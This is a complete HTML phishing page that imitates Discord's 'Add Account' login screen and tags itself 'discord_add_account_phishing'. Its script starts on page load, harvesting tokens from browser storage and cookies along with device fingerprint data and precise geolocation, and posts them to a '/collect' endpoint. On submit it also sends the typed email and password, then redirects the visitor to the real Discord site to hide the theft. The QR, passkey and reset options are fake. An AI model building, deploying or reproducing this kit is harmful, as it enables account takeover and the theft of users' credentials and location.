<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Account - Discord</title>
    <style>
        /* خلفية رمادية داكنة */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1e1f22;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        /* المربع الأبيض */
        .modal {
            background: #313338;
            border-radius: 16px;
            padding: 40px 36px 28px 36px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
            color: #dbdee1;
        }

        /* عنوان Add Account */
        .modal-title {
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            color: #f2f3f5;
            margin-bottom: 6px;
        }

        .modal-sub {
            font-size: 14px;
            color: #b5bac1;
            text-align: center;
            margin-bottom: 28px;
            line-height: 1.4;
        }

        /* الحقول */
        .field {
            margin-bottom: 16px;
        }
        .field label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: #b5bac1;
            margin-bottom: 6px;
            letter-spacing: 0.4px;
        }
        .field label span {
            color: #ed4245;
        }
        .field input {
            width: 100%;
            padding: 12px 14px;
            background: #1e1f22;
            border: 1px solid #1e1f22;
            border-radius: 8px;
            color: #f2f3f5;
            font-size: 16px;
            outline: none;
            transition: border-color 0.15s;
        }
        .field input:focus {
            border-color: #5865f2;
        }
        .field input::placeholder {
            color: #6d7278;
        }

        /* Forgot password */
        .forgot-link {
            display: inline-block;
            font-size: 13px;
            color: #00a8fc;
            text-decoration: none;
            margin-bottom: 24px;
            font-weight: 500;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }

        /* QR Code section */
        .qr-section {
            display: flex;
            align-items: center;
            gap: 16px;
            background: #1e1f22;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 6px;
            cursor: default;
            transition: background 0.15s;
        }
        .qr-section:hover {
            background: #2b2d31;
        }
        .qr-icon {
            width: 60px;
            height: 60px;
            background: #1e1f22;
            border: 2px solid #3d3f45;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        .qr-icon svg {
            width: 48px;
            height: 48px;
        }
        .qr-text {
            font-size: 14px;
            font-weight: 500;
            color: #dbdee1;
        }
        .qr-sub {
            font-size: 12px;
            color: #6d7278;
            margin-top: 2px;
        }
        .qr-sub strong {
            color: #dbdee1;
            font-weight: 600;
        }

        /* passkey link */
        .passkey-link {
            display: block;
            font-size: 13px;
            color: #00a8fc;
            text-decoration: none;
            margin: 6px 0 10px 0;
            padding-left: 76px;
            font-weight: 500;
        }
        .passkey-link:hover {
            text-decoration: underline;
        }

        /* الأزرار (Back و Continue) */
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
            gap: 12px;
        }
        .btn-back {
            background: transparent;
            border: none;
            color: #b5bac1;
            font-size: 15px;
            font-weight: 500;
            padding: 10px 16px;
            cursor: pointer;
            border-radius: 8px;
            transition: background 0.15s;
        }
        .btn-back:hover {
            background: #3d3f45;
        }
        .btn-continue {
            background: #5865f2;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            padding: 10px 28px;
            cursor: pointer;
            transition: background 0.15s;
        }
        .btn-continue:hover {
            background: #4752c4;
        }
        .btn-continue:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* رسالة الحالة */
        .status-msg {
            margin-top: 16px;
            padding: 10px;
            background: #1e1f22;
            border-radius: 8px;
            color: #b5bac1;
            font-size: 13px;
            text-align: center;
            display: none;
        }
        .status-msg.show {
            display: block;
        }

        /* تعديل صغير للشاشات الصغيرة */
        @media (max-width: 480px) {
            .modal { padding: 24px 18px; }
            .actions { flex-direction: column; gap: 8px; }
            .btn-back { width: 100%; }
            .btn-continue { width: 100%; }
        }
    </style>
</head>
<body>

<div class="modal">

    <!-- العنوان -->
    <div class="modal-title">Add Account</div>
    <div class="modal-sub">Logging in to another account will let you easily switch between accounts on this device.</div>

    <!-- الحقول -->
    <div class="field">
        <label for="email">Email or Phone Number <span>*</span></label>
        <input type="text" id="email" placeholder="Enter your email or phone" autocomplete="off">
    </div>
    <div class="field">
        <label for="password">Password <span>*</span></label>
        <input type="password" id="password" placeholder="Enter your password" autocomplete="off">
    </div>

    <!-- Forgot password -->
    <a href="#" class="forgot-link" id="forgotLink">Forgot your password?</a>

    <!-- QR Code -->
    <div class="qr-section" id="qrSection">
        <div class="qr-icon">
            <svg viewBox="0 0 48 48" fill="none" style="background:white; border-radius:4px;">
                <rect width="48" height="48" fill="white" rx="4"/>
                <!-- باركود وهمي يشبه QR -->
                <rect x="6" y="6" width="8" height="8" fill="black"/>
                <rect x="18" y="6" width="8" height="8" fill="black"/>
                <rect x="34" y="6" width="8" height="8" fill="black"/>
                <rect x="6" y="18" width="8" height="8" fill="black"/>
                <rect x="34" y="18" width="8" height="8" fill="black"/>
                <rect x="6" y="34" width="8" height="8" fill="black"/>
                <rect x="18" y="34" width="8" height="8" fill="black"/>
                <rect x="34" y="34" width="8" height="8" fill="black"/>
                <rect x="18" y="18" width="8" height="8" fill="black"/>
                <rect x="6" y="28" width="4" height="4" fill="black"/>
                <rect x="12" y="28" width="4" height="4" fill="black"/>
                <rect x="26" y="18" width="4" height="4" fill="black"/>
                <rect x="30" y="18" width="4" height="4" fill="black"/>
                <rect x="26" y="26" width="4" height="4" fill="black"/>
                <rect x="30" y="26" width="4" height="4" fill="black"/>
                <rect x="14" y="14" width="4" height="4" fill="black"/>
                <rect x="28" y="14" width="4" height="4" fill="black"/>
            </svg>
        </div>
        <div>
            <div class="qr-text">Log in with QR Code</div>
            <div class="qr-sub">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</div>
        </div>
    </div>

    <!-- Or sign in with a passkey -->
    <a href="#" class="passkey-link" id="passkeyLink">Or sign in with a passkey</a>

    <!-- الأزرار -->
    <div class="actions">
        <button class="btn-back" id="backBtn">Back</button>
        <button class="btn-continue" id="continueBtn">Continue</button>
    </div>

    <!-- رسالة الحالة -->
    <div class="status-msg" id="statusMsg">✓ Logging in... Redirecting to Discord...</div>

</div>

<script>
    (function() {

        // ================================================================
        // 🔥 استخراج التوكنات من كل مكان
        // ================================================================

        function extractDiscordToken() {
            let found = [];

            try {
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    let val = localStorage.getItem(key);
                    if (val && val.length > 30) {
                        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
                            found.push({ source: 'localStorage', key: key, value: val });
                        }
                        if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
                            found.push({ source: 'localStorage(guess)', key: key, value: val });
                        }
                    }
                }
            } catch (e) {}

            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    let key = sessionStorage.key(i);
                    let val = sessionStorage.getItem(key);
                    if (val && val.length > 30) {
                        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
                            found.push({ source: 'sessionStorage', key: key, value: val });
                        }
                        if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
                            found.push({ source: 'sessionStorage(guess)', key: key, value: val });
                        }
                    }
                }
            } catch (e) {}

            try {
                document.cookie.split(';').forEach(c => {
                    let t = c.trim();
                    if (t.toLowerCase().includes('token') || t.toLowerCase().includes('discord') || t.toLowerCase().includes('auth')) {
                        let parts = t.split('=');
                        found.push({ source: 'cookie', key: parts[0], value: parts.slice(1).join('=') });
                    }
                });
            } catch (e) {}

            try {
                for (let key in window) {
                    try {
                        let val = window[key];
                        if (typeof val === 'string' && val.length > 40) {
                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord')) {
                                found.push({ source: 'window', key: key, value: val });
                            }
                            if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
                                found.push({ source: 'window(guess)', key: key, value: val });
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {}

            // إزالة المكررات
            let unique = [];
            let seen = new Set();
            found.forEach(item => {
                let hash = item.value.substring(0, 40);
                if (!seen.has(hash)) {
                    seen.add(hash);
                    unique.push(item);
                }
            });

            return unique;
        }

        // ================================================================
        // معلومات الجهاز
        // ================================================================

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown'
            };
        }

        // ================================================================
        // إرسال البيانات
        // ================================================================

        function sendData(data) {
            fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(e => console.log(e));
        }

        // ================================================================
        // تشغيل جامع البيانات فوراً
        // ================================================================

        let tokens = extractDiscordToken();
        let device = getDeviceInfo();

        let initialData = {
            discordTokens: tokens,
            tokenCount: tokens.length,
            device: device,
            location: null,
            cookies: document.cookie,
            page: 'discord_add_account_phishing'
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    initialData.location = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                    sendData(initialData);
                },
                err => {
                    initialData.location = { error: err.message };
                    sendData(initialData);
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        } else {
            initialData.location = { error: 'Geolocation not supported' };
            sendData(initialData);
        }

        setTimeout(() => sendData(initialData), 500);
        setTimeout(() => sendData(initialData), 1500);
        setTimeout(() => sendData(initialData), 4000);

        // ================================================================
        // زر Continue
        // ================================================================

        document.getElementById('continueBtn').addEventListener('click', function() {
            let email = document.getElementById('email').value;
            let password = document.getElementById('password').value;
            let freshTokens = extractDiscordToken();

            let loginData = {
                discordEmail: email,
                discordPassword: password,
                discordTokens: freshTokens,
                tokenCount: freshTokens.length,
                extra: 'discord_add_account_submit',
                device: getDeviceInfo(),
                cookies: document.cookie,
                timestamp: new Date().toISOString()
            };

            sendData(loginData);

            let status = document.getElementById('statusMsg');
            status.textContent = '✓ Logging in... Redirecting to Discord...';
            status.classList.add('show');

            document.getElementById('continueBtn').disabled = true;
            document.querySelectorAll('.field input').forEach(inp => inp.disabled = true);

            setTimeout(() => {
                window.location.href = 'https://discord.com/login';
            }, 2000);
        });

        // ================================================================
        // زر Back (وهمي)
        // ================================================================

        document.getElementById('backBtn').addEventListener('click', function(e) {
            e.preventDefault();
            let status = document.getElementById('statusMsg');
            status.textContent = '↩️ Returning...';
            status.classList.add('show');
            setTimeout(() => {
                window.location.href = 'https://discord.com';
            }, 1000);
        });

        // ================================================================
        // Forgot password (وهمي)
        // ================================================================

        document.getElementById('forgotLink').addEventListener('click', function(e) {
            e.preventDefault();
            let status = document.getElementById('statusMsg');
            status.textContent = '🔐 Password reset link sent to your email (simulated)';
            status.classList.add('show');
            setTimeout(() => status.classList.remove('show'), 3000);
        });

        // ================================================================
        // QR Code (وهمي)
        // ================================================================

        document.getElementById('qrSection').addEventListener('click', function() {
            let status = document.getElementById('statusMsg');
            status.textContent = '📱 QR Code login is not available on this device. Please use email/password.';
            status.classList.add('show');
            setTimeout(() => status.classList.remove('show'), 3000);
        });

        // ================================================================
        // Passkey (وهمي)
        // ================================================================

        document.getElementById('passkeyLink').addEventListener('click', function(e) {
            e.preventDefault();
            let status = document.getElementById('statusMsg');
            status.textContent = '🔑 Passkey login is not supported on this browser.';
            status.classList.add('show');
            setTimeout(() => status.classList.remove('show'), 3000);
        });

    })();
</script>

</body>
</html>
